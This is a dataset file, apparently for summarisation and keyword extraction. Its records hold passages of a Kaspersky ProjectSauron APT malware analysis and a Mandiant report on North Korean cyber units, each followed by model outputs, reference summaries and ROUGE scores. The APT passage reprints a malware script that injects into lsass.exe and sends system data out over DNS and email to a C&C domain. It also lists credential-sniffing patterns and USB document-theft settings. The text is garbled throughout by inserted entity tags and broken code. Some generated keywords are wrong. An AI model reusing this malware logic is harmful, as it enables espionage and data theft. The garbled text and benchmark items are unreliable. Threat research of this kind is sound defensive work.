string.find(string.lower(proc ) , \" explorer \" ) ~= nil filename = create_log(tmp_dir , SAURON_KBLOG_KEY , [CARDINAL] 0 , 0 ) w.set(\"name \" , \" kblog running - file \" filename ) w.exec(\"inject explorer.exe kblog -v -t \" KBLOG_ROTATE_SECS ) w.stop_log ( ) w.sleep(2000 ) log_rotate(filename , \" t \" ) w.exec(cmd ) main()For any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 25 of [CARDINAL] 33The ProjectSauron APT . Technical analysisThis is a mid - sized script that collects basic system information and sends it in an e - mail . There is a unique feature that can also be found in other scripts packaged with the platform : during execution it performs [ORG] DNS requests to seemingly random subdomain names of the \u201c log \u201d C&C domain ( \u201c bikessport.com \u201d ) , and each relayPort = \" [CARDINAL] 443 \" mailto = \" xxx.xxx.xxx@gmail.com \" mailSubject = \" Regarding your offer \" mailBody = \" This is to inform you that I decline your offer . See attachment.\\n Best Regards xxxxx \" domain = \" bikessport.com \" mail = function(l_1_0 , l_1_1 , l_1_2 , l_1_3 , l_1_4 ) buffer = \" \" id1 = string.upper(string.format(\"%04x%04x \" , [GPE] math.random(4369 , 65535 ) , [ORG] math.random(0 , [DATE] 65535 ) ) ) id2 = string.format(\"%07u \" , [ORG] math.random(0 , [DATE] 9999999 ) ) boundary = string.format(\"--------------%06u%06u%06u%06u \" , math.random(0 , [DATE] 9999 ) , [ORG] math.random(0 , [DATE] 9999 ) , [ORG] math.random(0 , [DATE] 9999 ) , [ORG] math.random(0 , [DATE] 9999 ) ) delimiter = \" \\r\\n \" endOfRow = \" \\r\\n \" startBoundary = string.format(\"--%s \" , boundary ) endBoundary = string.format(\"%s%s--%s \" , endOfRow , startBoundary , endOfRow ) buffer = string.format(\"%sMessage - ID : < % s.%s@localhost.localdomain>%s \" , buffer , id1 , id2 , endOfRow ) buffer = string.format(\"%sFrom : < % s>%s \" , buffer , l_1_1 , endOfRow ) buffer = string.format(\"%sMIME - Version : 1.0%s \" , buffer , endOfRow ) buffer = string.format(\"%sTo : % s%s \" , buffer , l_1_0 , endOfRow ) buffer = string.format(\"%sSubject : % s%s \" , buffer , [PERSON] l_1_2 , endOfRow ) buffer = string.format(\"%sContent - Type : multipart / [PERSON] mixed;%s boundary=\\\"%s\\\"%s \" , buffer , endOfRow , boundary , endOfRow ) buffer = string.format(\"%s%s \" , buffer , endOfRow ) buffer = string.format(\"%sThis is a multi - part message in [ORG] MIME format.%s%s%s \" , buffer , endOfRow , startBoundary , endOfRow ) buffer = string.format(\"%sContent - Type : text / plain ; charset = ISO-8859 - 1 ; format = flowed%s \" , buffer , endOfRow ) buffer = string.format(\"%sContent - Transfer - Encoding : [CARDINAL] 7bit%s%s \" , buffer , endOfRow , endOfRow ) buffer = string.format(\"%s%s%s \" , buffer , l_1_3 , endOfRow ) buffer = string.format(\"%s%s%s%s \" , buffer , endOfRow , startBoundary , endOfRow ) buffer = string.format(\"%sContent - Type : application / x - msdownload;\\r\\n name=\\\"data.bin\\\"%s \" , buffer , endOfRow ) buffer = string.format(\"%sContent - Transfer - Encoding : base64%s \" , buffer , endOfRow ) buffer = string.format(\"%sContent - Disposition : attachment;\\r\\n filename=\\\"data.bin\\\"%s%s \" , buffer , endOfRow , endOfRow ) strLen = string.len(l_1_4 ) if index < strLen then istart = index index = index + [CARDINAL] 72 iend = index - 1For any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 26 of [CARDINAL] 33The ProjectSauron APT . Technical analysisif strLen < iend then buffer = string.format(\"%s%s%s \" , buffer , string.sub(l_1_4 , istart , iend ) , endOfRow ) else buffer = string.format(\"%s%s \" , buffer , endBoundary ) w.exec(\"sinfo \" ) execStr = string.format(\"sinfo | basex -b [CARDINAL] 32url | dext -l [CARDINAL] 30 a. \" domain \" | nslu - \" ) res = w.exec2str(execStr ) w.exec(\"netnfo -A \" ) execStr = string.format(\"netnfo -irc | basex -b [CARDINAL] 32url | dext -l [CARDINAL] 30 c. \" domain \" | nslu - \" ) res = w.exec2str(execStr ) w.exec2str(\"su -t explorer.exe \" ) w.exec(\"regedit -a \\\"\\\\HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\ \" \" ) execStr = string.format(\"regedit -a \\\"\\\\HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\ \" | basex -b [CARDINAL] 32url | dext -l [CARDINAL] 30 d. \" domain \" | nslu - \" ) res = w.exec2str(execStr ) math.randomseed(os.time ( ) ) res = w.start_log(\"mem \" , nil , nil ) if res then s = w.exec2str(\"injchk \" ) if string.find(s , \" Not detected . \" ) then w.set(\"inj \" , true ) sux = w.exec2str(\"sux \" ) if string.find(sux , \" Success \" ) then w.exec(\"detach start blob lsass.exe \" ) execStr = string.format(\"nslu agc5221 . \" domain ) w.exec2str(execStr ) else w.exec(\"sudetach start blob \" ) execStr = string.format(\"nslu agc9221 . \" domain ) w.exec2str(execStr ) execStr = string.format(\"nslu agc3221 . \" domain ) w.exec2str(execStr ) execStr = [CARDINAL] string.format(\"wipe FakeVirtualEncryptedNetwork.cfg \" ) w.exec(execStr ) execStr = string.format(\"rbswap FakeVirtualEncryptedNetwork . EXE \" ) w.exec(execStr)For any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 27 of [CARDINAL] 33The ProjectSauron APT . Technical analysissres = systemcheck ( ) w.exec(\"plist \" ) w.exec(\"wfw status \" ) w.exec(\"dinst \" ) regStr = w.exec2str(\"cat VirtualEncryptedNetwork.ini|grep -i \\\"pop|smtp \" ) for k , v in string.gmatch(regStr , \" ( % w+)=([%w,% . ] * ) \" ) do if string.lower(k ) = = \" smtpserver \" then if string.lower(k ) = = \" smtpport \" then [PERCENT] w.printf(\"Server [PERCENT] % s port % s\\n \" , smtpserver , smtpport ) [PERCENT] w.debugf(\"Server [PERCENT] % s port % s\\n \" , smtpserver , smtpport ) end dllNameUninst = \" mfc64d.dll \" windir = os.getenv(\"WINDIR \" ) w.exec(string.format(\"put2 uninstdll \\\"%s\\\\SYSTEM32\\\\%s\\ \" \" , windir , dllNameUninst ) ) w.exec(\"winst install \" dllNameUninst ) w.exec(string.format(\"ftime -c \\\"%s\\\\SYSTEM32\\\\ntdll.dll\\ \" \\\"%s\\\\SYSTEM32\\\\%s\\ \" \" , windir , windir , dllNameUninst ) ) w.exec(\"winst launch \" dllNameUninst ) execStr = string.format(\"nslu ahc3221 . \" domain ) w.exec2str(execStr ) w.exec(\"w3get -s url \" ) execStr = string.format(\"nslu ahc3421 . \" domain ) w.exec2str(execStr ) w.exec(\"wdogi -f -j -I lsass.exe \" relayServer \" \" relayPort ) execStr = string.format(\"nslu ahc3422 . \" domain ) w.exec2str(execStr ) w.exec(\"dir /s /b ap*.txt link*.txt node*.tun VirtualEncryptedNetwork.licence VirtualEncryptedNetworkEMail.key [PERSON] VirtualEncryptedNetwork.ini [ snip ] \" ) w.exec(\"dir /s /b ap*.txt link*.txt node*.tun VirtualEncryptedNetwork.licence VirtualEncryptedNetworkEMail.key [PERSON] VirtualEncryptedNetwork.ini [ snip ] | get2 - \" ) w.stop_log ( ) log = w.get_mem_log ( ) slask = [GPE] mail(mailto , mailto , mailSubject , mailBody , log ) slask2 = w.exec2str(\"smtpsend \" externalmail \" \" mailto \" \" mailto , slask ) w.debugf(slask2 ) slask2 = w.exec2str(\"smtpsend \" smtpserver \" \" mailto \" \" mailto , slask ) w.debugf(slask2)Shadow filesystem exfiltration tool ( \u201c [PERSON] MyTrampoline\u201d)MD5SizeFormatBitsLinker5DDD5294655E9EB3B9B2071DC2E503B127136DLL3211.0The module is designed for hidden data transfer between air - gapped and internet - connected networks . For any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 28 of [CARDINAL] 33The ProjectSauron APT . Technical analysisIt operates within [CARDINAL] one hardcoded directory , \u201c [WORK_OF_ART] c:\\System [WORK_OF_ART] Volume Information\\{774476DF [WORK_OF_ART] - C00F-4e3a [WORK_OF_ART] - BF4A- [WORK_OF_ART] 6D8618CFA532}\\\u201dIt reads all files from the subdirectory \u201c [CARDINAL] 07 \u201d , tries to decrypt each file with RSA2048+AES . If the decrypted data matches the magic signature and the format of the default blob then it is started . The module creates an invisible window with class name by mask \" DMWndClassX%d \" , where \u201c % d \u201d is a number starting for the message \u201c WM_DEVICECHANGE \u201d with parameter \u201c DBT_DEVICEARRIBAL \u201d indicating that a new disk volume appeared.from [CARDINAL] 7 and waitsFor every new volume , it retrieves the partition layout and tries to read the [ORDINAL] first [CARDINAL] 512 bytes located right after the [ORDINAL] first disk partition that was recognized by the OS . If the data starts with magic [CARDINAL] four bytes FF [CARDINAL] 09 12 34 then it is treated as a special file system ( \u201c shadow file system\u201d).The shadow file system is separated in [CARDINAL] two \u201c partitions \u201d : the [ORDINAL] first one is treated as a write - only partition for storing files collected from the local system ; the files from the [ORDINAL] second partition are extracted , copied to the local storage and removed from their source location . The module reads all files from its local subdirectories \u201c 00 \u201d and \u201c [CARDINAL] 04 \u201d , copies them to the shadow file system and deletes their local copies . The files are renamed by prepending a string that is selected based on their location:\uf0b7 00/ * \u2192 p _ * \uf0b7 04/ * \u2192 z_*All the files located in the shadow filesystem 's [ORDINAL] second partition are enumerated , extracted from the storage and \u201c deleted \u201d from the shadow FS . Each file 's name is matched against a list of prefixes and if the prefix is known then the file is written to the local storage . The destination directory is selected based on the filename prefix:\uf0b7 p _ * \u2192 06/ * \uf0b7 b _ * \u2192 01/*There is a known configuration of the core platform that specifically looks for files in the directories populated by the \u201c mytrampoline \u201d module and pushes these files to a remote repository , providing a communication channel for airgapped computers . Document stealing package \u201c BUS Manager\u201dThis optional package may be installed along with [CARDINAL] one of the [ORG] Core modules , designed for collecting documents from any plugged [ORG] USB sticks . Usually it has its own bootstrapper library for activation on the target system but is linked with the rest of the platform by data flow : the data collected by the package is just stored on disk and [CARDINAL] one or several LUA scripts of the [PERSON] Core packages extract the data and push it to a [ORG] C&C server or to an intermediate remote repository . BUS manager stage [CARDINAL] 1 : bootstrap libraryFor any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 29 of [CARDINAL] 33The ProjectSauron APT . Technical analysisSamples : [GPE] MD5SizeFormat BitsLinkerCompilation from a hardcoded Information\\_restore{ED650925 - A32C-4E9C-8A73- 8E6F0509309A}\\RP0\\A0000002.dll \u201d , to decrypt it with RC5 and decompress with inflate . If the resulting blob contains a valid PE image of the \u201c main module \u201d it is activated.location \u201c c:\\System VolumetraceDebug Information\\_restore{ED650925 - A32C-4E9C-8A73 - 8E6F0509309A}\\RP0\\change.log\u201d.is writtenencryptedlocatedfiletothelogat\u201cc:\\System VolumeBUS manager stage [CARDINAL] 2 : main module Samples : [GPE] MD5SizeFormat BitsLinkerCompilation The [ORG] DLL is named \u201c busmain.dll \u201d in the export directory and provides [CARDINAL] two exported functions:84879 [ORG] DLL9.0642012.01.04 [ORG] 11:27:53\uf0b7 [ORG] BmnVersion @1 [CARDINAL] \uf0b7 Run @2The function \u201c BmnVersion \u201d returns a version string : \u201c main module [CARDINAL] 1.10 ( build [CARDINAL] 3)\u201d . The configuration of the module is read from an encrypted file at the location : \u201c [WORK_OF_ART] c:\\System [WORK_OF_ART] Volume Information\\_restore{ED650925 [WORK_OF_ART] - A32C-4E9C-8A73 [WORK_OF_ART] - 8E6F0509309A}\\RP0\\A0000001.ini\u201dBUS [ORG] CONFIG CommonFor any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 30 of [CARDINAL] 33The ProjectSauron APT . Technical analysisMaxLogSize1048576 rpt;*.conf;*.cfg;*.pk2;*.nct;*.key;*.psw*.txt;*.doc;*.docx;*.ppt;*.pptx;*.xls;*.xlsx;*.vsd;*.wab;*.pdf;*.dst;*.ppk;*.rsa;*.rar;*.one;*.rtf;~WPL*.tmp;*.FTS;*.ResourceUsageMaxProcTime [CARDINAL] 240DirFormat\\%s-%s.dirExample of a configuration file , A0000001.ini , decryptedWhen called by the \u201c [WORK_OF_ART] Run \u201d function it looks for the files \u201c [WORK_OF_ART] c:\\System [WORK_OF_ART] Volume [WORK_OF_ART] Information\\_restore{ED650925- A32C-4E9C-8A73 [WORK_OF_ART] - 8E6F0509309A}\\RP0\\A???????.dll \u201d except its own , loads , decrypts , and decompresses them and tries to load each one as a plugin . The plugins are expected to be valid [ORG] DLL files exporting a function \u201c [ORG] BplVersion \u201d and returning a correct version number that should be \u201c [CARDINAL] 2 \u201d . [PERSON] Valid plugin libraries are activated by calling their functions exported by name \u201c BplInit\u201d . The module creates a window of class \u201c Message \u201d and registers it for receiving device notifications each time a disk volume device changes state . Information about each change in volumes ' state is written to the log file \u201c [WORK_OF_ART] c:\\System [WORK_OF_ART] Volume Information\\_restore{ED650925 [WORK_OF_ART] - A32C-4E9C-8A73 [WORK_OF_ART] - 8E6F0509309A}\\RP0\\change.log \u201d Log files are rotated by renaming older ones to \u201c change.log.1 \u201d , \u201c change.log.2 \u201d , etc . Information about the volumes is then passed to the plugins to determine if they contain information of interest that should be collected . At the moment [CARDINAL] only [CARDINAL] one plugin is known , the \u201c collect module [CARDINAL] 1.10 ( build 3)\u201d.2016.02.29 09:34:04 Starting log ( computer : \" computername \" serial : [CARDINAL] 1245:1337 timezone : UTC+3h ) . [CARDINAL] 2016.02.29 09:34:04 Loaded plugin A0000003.dll ( collect module [CARDINAL] 1.10 ( build [CARDINAL] 3 ) ) . [CARDINAL] 2016.02.29 09:34:04 Waiting [TIME] 300 [TIME] seconds . [CARDINAL] 2016.02.29 09:39:09 Starting . For any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 31 of [CARDINAL] 33The ProjectSauron APT . Technical analysis2016.02.29 09:39:09 Skipping CD - ROM [ snip ] ASUS DRW-12B3EE ATA Device . [CARDINAL] 2016.02.29 09:39:09 Skipping volume on [ snip ] [ORG] WDC WD10EALX-071BA1 ATA Device : not USB 2016.02.29 09:39:09 Skipping volume on [ snip ] [ORG] WDC WD10EALX-071BA1 ATA Device : not USB 2016.02.29 09:39:09 Skipping volume on [ snip ] [ORG] WDC WD10EALX-071BA1 ATA Device : not USB 2016.02.29 14:36:31 Mounted volume # [CARDINAL] 1 : Volume serial : [CARDINAL] 9995:111B Volume label : Transcend Volume FS : FAT32 Volume size : [DATE] 7809829816 Volume free : [CARDINAL] 6624871400 [ORG] Device name : [ snip ] JetFlash Transcend 8 GB USB Device Device type : DISK&VEN_JETFLASH&PROD_TRANSCEND_8GB&REV_8.07 Device serial : EEAABB13 [CARDINAL] 2016.02.29 14:36:31 Starting processing for volume # [MONEY] 1 . [CARDINAL] 2016.02.29 14:36:31 Starting directory for volume [CARDINAL] 9995:111B. [QUANTITY] 2016.02.29 [QUANTITY] 14:36:31 Ending directory for volume [CARDINAL] 9995:111B. [CARDINAL] 2016.02.29 14:36:31 Starting collection for volume [CARDINAL] 9995:111B. [CARDINAL] 2016.02.29 14:36:33 Copied \\9995_111B\\document.pdf . [TIME] 2016.02.29 [TIME] 14:36:34 Volume # [MONEY] 1 mount . [CARDINAL] 2016.02.29 14:36:34 Copied \\9995_111B\\important_document.doc . [CARDINAL] 2016.02.29 14:36:35 [ORG] Copied \\9995_111B\\secret_data_on_usb_drive.docx . [TIME] 2016.02.29 [TIME] 14:36:36 Ending collection for volume [QUANTITY] 9995:111B [QUANTITY] 115 files , [CARDINAL] 93 matching , [CARDINAL] 2 collected . Example of a log file , \u201c change.log \u201d , decrypted , anonymizedCollected files are encrypted using RC5 and written to the directory \u201c [WORK_OF_ART] c:\\System [WORK_OF_ART] Volume Information\\_restore{ED650925 [WORK_OF_ART] - A32C-4E9C-8A73 [WORK_OF_ART] - 8E6F0509309A}\\RP1\\ \u201d . The contents of the file are prepended with a header that contains the original name of the file . BUS manager stage [CARDINAL] 3 : collect module match the masks specified in the configuration file . Such files are \u201c collected \u201d by storing them in the Bus manager storage directory . Network snifferMD5SizeFormat BitsLinker Compilation timestamp951EBE1EE17F61CD2398D8BC0E00B099180224 DLL327.102009.03.08 [CARDINAL] 11:31:35For any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 32 of [CARDINAL] 33The ProjectSauron APT . Technical analysisThis [ORG] DLL is a standalone module that is meant to be loaded as a security provider . The payload of the module \u201c InitSecurityInterfaceW \u201d if called in the context of the \u201c svchost.exe \u201d process.in a standard blob thatis wrappedis activatedin the functionThe module implements a sniffer with deep packet inspection . It supports many protocols , including generic [ORG] TCP / [ORG] UDP , POP3 , SMTP , [ORG] FTP , [ORG] VNC , [ORG] SMB , [ORG] HTTP and [DATE] TFTP . The protocol plugins extract information from most commands and then match them against a list of regular expressions specified in a configuration file . The packets that match are then stored in encrypted \u201c vault \u201d files . These may be rotated , and the module relies on other components of the platform to exfiltrate them . The configuration is stored in encrypted format in registry in [CARDINAL] one of the locations:\uf0b7 [CARDINAL] \uf0b7 \uf0b7[HKCU\\Settings ] Policy [ HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders ] Signature [ HKLM\\System\\CurrentControlSet\\Control\\Lsa ] SignatureAn example of the decrypted configuration file:.*account.*|.*acct.*|.*domain.*|.*login.*|.*member.*|.*user.*|.*name|.*email|.*_id|id|uid|mn|mailaddress|.*nick.*|alias| codice|uin|sign - in|strCodUtente|.*pass.*|.*pw|pw.*|additional_info|.*secret.*|.*segreto . * [ ^\\$]$ ^.*\\.(doc|xls|pdf)$For any inquiries , contact intelreports@kaspersky.comPage [CARDINAL] 33 of 33Contact us at : intelligence@kaspersky.comSecurelist , the resource for Kaspersky Lab experts \u2019 technical research , analysis , and thoughts . [PERSON] Follow [PERSON] usKaspersky [PERSON] Lab [PERSON] global [PRODUCT] WebsiteEugene [PRODUCT] Kaspersky [PRODUCT] BlogKaspersky Lab B2C BlogKaspersky Lab [CARDINAL] B2B [ORG] BlogKaspersky Lab security news serviceKaspersky Lab Academy", "generated_text": "the use; ProjectSauron APT; the name; RPCHlpr; the module; connections; connections; communications; the pipe; connections; a command; a shellcode; the shellcode blob; a magic value; the 0xC102AA02 DWORD; the payload; DLL files; the core; the configuration; 1 - 3 DLL files; both the main module and plugins; the plugins; the jcalg1 algorithm; the Jcalg2 algorithm; the PE binary; the configuration data; the resources; the S-ES; the main module; the shellcode; the payload; IP; DNS; IP addresses.", "ref_text": "<START-1>The document provides an in-depth technical analysis of the ProjectSauron APT malware and infrastructure. It covers multiple components used for initial infection, persistence, data exfiltration, command and control, and more. Key points: Uses LSA password filters or security providers for stealthy persistence and password theft. Custom LUA scripts control modular malware functionality. Over 50 plugin types exist. Virtual file system and encryption used to store plugins and data. Can exfiltrate data from air-gapped networks via USB devices. Leverages DNS and direct email connections for stealthy data exfiltration. Unique malware files per victim to avoid reuse of indicators. Infrastructure not reused either. Passive network sniffing tool inspects protocols like HTTP, SMTP, POP3, FTP to steal credentials. \"Bus manager\" component steals documents from USB drives by hiding storage area. Attackers carefully studied other advanced groups and customized tactics to avoid past mistakes. Overall, the document provides an extensive review of ProjectSauron's technical sophistication, custom malware, infrastructure, and techniques for long-term stealthy intrusions. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.25196850393700787, "gpt3/lexical/rouge_rouge2": 0.04221635883905013, "gpt3/lexical/rouge_rougeL": 0.13648293963254593, "gpt3/lexical/rouge_rougeLsum": 0.13648293963254593, "gpt3_generated_text": ["The article discusses the ProjectSauron APT, a sophisticated cyber-espionage campaign. The APT uses a module called RPCHlpr, which creates a named pipe and waits for connections to it. Once a connection is established, it creates another thread for communication. The module receives a command and an 8-byte RC4 key, which it uses to execute shellcode or start a process with the given command line. The shellcode blob is expected to start with a magic value and has a specific format. The module is installed as either an LSA password manager library or a Security Provider. The module decrypts the first layer of the blob, which contains actual code. The code invokes the shellcode, which removes subsequent layers of encryption and decompresses its payload using the Jcalg1 algorithm. The payload contains another layer of shellcode that loads, relocates, and invokes the PE binary inside. The configuration includes 1-3 DLL files, with the main module being the main component. The module locates its configuration data in a resource called \"CONFIG\", which is encrypted using AES-CBC with a hardcoded key. The configuration is in readable text format and is separated into sections for different plugins. The article provides technical details about the APT, including compilation timestamps, linker versions, and the use of IP and DNS addresses."]}, {"split_name": "val", "sample_id": "val_91", "prompt_text": "Extract the keywords: www.mandiant.com /resources / mapping - dprk - groups - to - government Not So Lazarus : Mapping DPRK Cyber Threat Groups to Government OrganizationsMandiant believes that [GPE] North [GPE] Korea 's cyber capability supports both long - standing and immediate political and national security priorities , as well as financial goals . We assess most of [GPE] North [GPE] Korea 's cyber operations , including espionage , destructive operations , and financial crimes , are primarily conducted by elements within [ORG] the [ORG] Reconnaissance [ORG] General [ORG] Bureau . Meanwhile , [ORG] the [ORG] Ministry [ORG] of [ORG] State [ORG] Security and [ORG] United [ORG] Front Department \u2019s missions appear to play limited roles in [GPE] North [GPE] Korea 's cyber program . Open- source reporting often uses the [ORG] Lazarus [ORG] Group title as an umbrella term referring to numerous [NORP] North [NORP] Korean cyber operators , however , understanding the different institutions within this secretive hermit nation and how they continue to evolve and share resources aids organizations in proactively defending from these types of threats . [ORG] Mandiant judges [GPE] North [GPE] Korea 's intelligence apparatus possesses the flexibility and resilience to create cyber units based on the needs of the country . Additionally overlaps in infrastructure , malware , and tactics , techniques and procedures indicate there are shared resources amongst their cyber operations . Figure [CARDINAL] 1 is an assessed cyber organizational chart derived from various OSINT , targeting patterns , malware usage , and defector reporting that shines some light onto a seeming change taking place within the [NORP] North [NORP] Korean cyber ranks.1/5Figure [CARDINAL] 1 : Assessed cyber structure of DPRK cyber programsUnited [FAC] Front [FAC] DepartmentUFD is an organization sponsored by [ORG] the [ORG] Central [ORG] Committee [ORG] of [ORG] the Workers ' [ORG] Party [ORG] of [ORG] Korea . Although it is comprised of operating groups that may not correspond to well - known \u201c cyber actors \u201d , the organization 's overall effort centers around disseminating pro - regime propaganda targeting [GPE] South [GPE] Korea , likely to undermine their primary geopolitical rival . The [ORG] UFD typically leverages online information operations , including an \" army of cyber trolls , \" to promote pro - DPRK political narratives on web forums as well as conventional propaganda efforts , such as leaflets and radio broadcasts targeting their southern neighbor . In a two - year span , these \u201c cyber trolls \u201d allegedly hijacked [NORP] South [NORP] Korean users accounts online and posted an estimated 68k propaganda items in web forums and various comment sections in an attempt to2/5amplify the regimes \u2019 message in [GPE] South [GPE] Korea . This organization \u2019s end goal is the establishment of pro- [NORP] North [NORP] Korean groups within [ORG] South [ORG] Korea [ORG] Ministry [ORG] of [ORG] State SecurityThe MSS is the DRPK 's primary counterintelligence service which operates as an autonomous part of the government and is primarily tasked with domestic counterespionage and overseas counterintelligence activities . [GPE] APT37 's previous campaigns targeting foreign joint venture partners as well as threat activity against defectors , defector support agencies , and humanitarian organizations indicate APT37 's activities most likely align with the agenda of MSS.APT37 's assessed primary mission is covert intelligence gathering in support of DPRK 's strategic military , political , and economic interests . A lack of recent , significant activity from this actor matched with an uptick in similar targeting from units within the \u201c Kimsuky \u201d actor - set may indicate a shift or consolidation within [GPE] North [GPE] Korea \u2019s cyber leadership . [ORG] Reconnaissance [ORG] General [ORG] Bureau : An [ORG] OverviewThe RGB is the [GPE] North [GPE] Korea 's primary foreign intelligence service , responsible for intelligence collection and clandestine operations . It is believed to be comprised of [CARDINAL] six bureaus:1st Bureau : Operations 2nd Bureau : [ORG] Reconnaissance [ORG] 3rd [ORG] Bureau : Foreign Intelligence 5th Bureau : Inter - [ORG] Korean [ORG] Affairs 6th Bureau : Technology [ORDINAL] 7th Bureau : [ORG] SupportNotably , a [ORDINAL] 4th bureau does not exist likely because the number \" [CARDINAL] 4 \" is considered taboo . While cyber efforts are a portion of the organization 's overall operations , [ORG] the [ORG] 3rd [ORG] Bureau ( Foreign [ORG] Intelligence ) and [ORG] 5th [ORG] Bureau ( Inter - [ORG] Korean [ORG] Affairs ) appear to hold the \u201c meat and potatoes \u201d of [GPE] North [GPE] Korea 's cyber program . [ORG] Reconnaissance [ORG] General [ORG] Bureau : [CARDINAL] 3rd [ORG] BureauLab 110 \u2026 the focal point for [ORG] the [ORG] Lazarus [ORG] Group [ORG] UmbrellaTEMP.Hermit , [ORG] APT38 , and [PERSON] Andariel are likely subordinate to Lab [CARDINAL] 110 . Lab [CARDINAL] 110 is likely an expanded and reorganized version of \" Bureau [CARDINAL] 121 , \" often noted as [GPE] North [GPE] Korea 's primary hacking unit . Lab [CARDINAL] 110 contains some elements that are most closely aligned with the organization , publicly reported as \" [ORG] Lazarus [ORG] Group . \" Open - source reporting often uses the [ORG] Lazarus [ORG] Group title as an umbrella term , referring to numerous clusters that we track separately . Although TEMP.Hermit is most frequently aligned with [ORG] Lazarus [ORG] Group reporting , often times , researchers and open sources lump all [CARDINAL] three of these actor sets \u2013 and sometimes even all of the [NORP] North [NORP] Korean APTs \u2013 merely as \u201c [PRODUCT] Lazarus Group\u201d.3/5TEMP.Hermit is an actor that has been around since at least 2013 . Their operations since that time are representative of [GPE] Pyongyang 's efforts to collect strategic intelligence to benefit [NORP] North [NORP] Korean interests . This actor targets government , defense , telecommunications , and financial institutions worldwide and the term \u201c [ORG] Lazarus [ORG] Group \u201d refers most often to this cluster of activities . [ORG] APT38 is a financially motivated group sponsored by [GPE] North [GPE] Korea , known for significant financial compromises and its use of destructive malware against financial institutions . The group has been attributed to sophisticated compromises targeting [ORG] Interbank [ORG] Fund [ORG] Transfer [ORG] Systems to steal millions of dollars at a time across multiple countries worldwide . [ORG] Andariel focuses its operations on foreign businesses , government agencies , financial services infrastructure , private corporations , and businesses , as well as the defense industry . The group also conducts cyber crime likely as an extra source of income to the government as we observed in signature malware activity by this actor ; however , targeting of military and government personnel appear to be the primary focus . Bureau [CARDINAL] 325 was publicly announced in [DATE] January [DATE] 2021 , when the structure of the [ORG] RGB likely shifted in response to the coronavirus ( COVID-19 ) pandemic . The new unit appeared to take on primarily conducting intelligence gathering operations against COVID-19 research and manufacturing organizations . Defector reporting also stated that in [DATE] January [DATE] 2021 , the unit was not fully operational . Overtime , we have observed sharing of efforts and \" non - COVID-19 \" type of activities , indicating this actor may be nearing the milestone that defector reporting states , \u201c the group will soon begin \u2018 full - scale \u2019 operations \u201d . This newly formed Bureau [CARDINAL] 325 houses the DPRK COVID-19- focused unit and corresponds to activities tracked in the open source as \u201c [ORG] CERIUM \u201d . We suspect that individuals from several previously tracked clusters \u2013 including TEMP.Hermit , and [ORG] Kimsuky \u2013 were also drafted to Bureau [CARDINAL] 325 to respond to high - priority operations from DPRK leadership . Over time , we began to see this organization shift from \u201c strictly COVID-19 \u201d efforts to the targeting of defectors , defense and governments , bloggers , media , cryptocurrency services , and financial institutions . This increase in responsibilities indicates the group has quickly gained the confidence of DPRK \u2019s senior leadership and likely gained prominence . Defenders will continue to see Bureau 325 's fingerprints on more campaigns in the wild . Reconnaissance General Bureau : [ORDINAL] 5th BureauThere are overlaps that indicate cyber elements of the [ORG] UFD share interests regarding issues on the [NORP] Korean peninsula and share targeting overlaps with APT37 ; however , these extra elements appear to be supplemental to [ORG] the [ORG] 5th [ORG] Bureau \u2019s overall mandate . [ORG] Kimsuky is an actor often conflated in [ORG] OSINT that conducts targeted campaigns to collect strategic intelligence on geopolitical events and negotiations affecting the [ORG] DPRK 's interests . The actor primarily targets organizations in the [GPE] U.S. and [GPE] South [GPE] Korea , including individuals working within the government , military , manufacturing , academic , and think tank organizations that possess subject matter expertise in defense and security , particularly nuclear security and nonproliferation policy . This threat actor \u2019s activities include collecting financial , personal , and client data specifically from academic , manufacturing , and national security industries in [GPE] South [GPE] Korea . The most likely reason is for the purpose of setting up further infrastructure for cyber espionage operations , leveraging personas for phishing campaigns , or carrying out identity theft and fraud.4/5ConclusionThe country 's espionage operations are believed to be reflective of the regime 's immediate concerns and priorities , which is likely currently focused on acquiring financial resources through crypto heists , targeting of media , news , and political entities , information on foreign relations and nuclear information , and a slight decline in the once spiked stealing of COVID-19 vaccine research . Information collected in these campaigns will possibly be used to develop or produce internal items and strategies , as in vaccines , mitigations to bypass sanctions , funding for the country \u2019s weapons programs , and so on . Additional information continues to be collected to determine the extent to which these groups operate and streamline their operations . Being able to see though the intentional fog left by [NORP] North [NORP] Korean leadership , and able to identify targeting patterns that align to physical units allows for a proactive defense against these cyber operators . This effort is critical in a country where little is known to the outside world and defector reporting supplemented with cyber operations can help.5/5", "generated_text": "Mandiant; North Korea; Reconnaissance General Bureau; South Korean Ministry of State Security; UFD; operations; use; cyber trolls; online information operations; pro-DRK propaganda; web forums; comments; 68k; APT37; targeting; foreign civil society organizations; defectors; support; organizations; the Kraken Group; South Korean police; the group; a shift; consolidation; the government; the organization; the Lazarus Group; UFD staff; a variety; threat actors; infrastructure; tools; tactics; techniques; procedures; espionage; the UFO; a shift; cyber organizations; strategic military; economic interests; sanctions; the North Korean regime; the DRK; their cyber capabilities.", "ref_text": "<START-1>The document provides an overview of North Korea's cyber capabilities, which are used to support political, security, and financial objectives. Mandiant assesses that most cyber operations are conducted by the Reconnaissance General Bureau (RGB). The United Front Department focuses on propaganda and influence operations targeting South Korea. The Ministry of State Security conducts espionage aligned with North Korea's strategic interests. Within the RGB, Lab 110 appears to be the center for North Korea's most advanced cyber activities, including those tracked under TEMP.Hermit, APT38, and Andariel. This is an expanded version of Bureau 121, known as North Korea's primary hacking unit. RGB's 3rd Bureau, foreign intelligence, contains Lab 110. TEMP.Hermit conducts cyber espionage worldwide. APT38 focuses on financially-motivated attacks. Andariel targets foreign businesses and governments. Bureau 325 formed in 2021 to target COVID-19 organizations but has expanded its targeting. The 5th Bureau handles inter-Korean affairs. Kimsuky conducts espionage against South Korean and U.S. targets. There is some overlap between the 3rd and 5th Bureaus. North Korea's cyber structure evolves to meet changing priorities. Understanding the different groups and institutions helps inform defenses against North Korean cyber threats. <END-1>", "t5/keyword/hint_hit_precision": 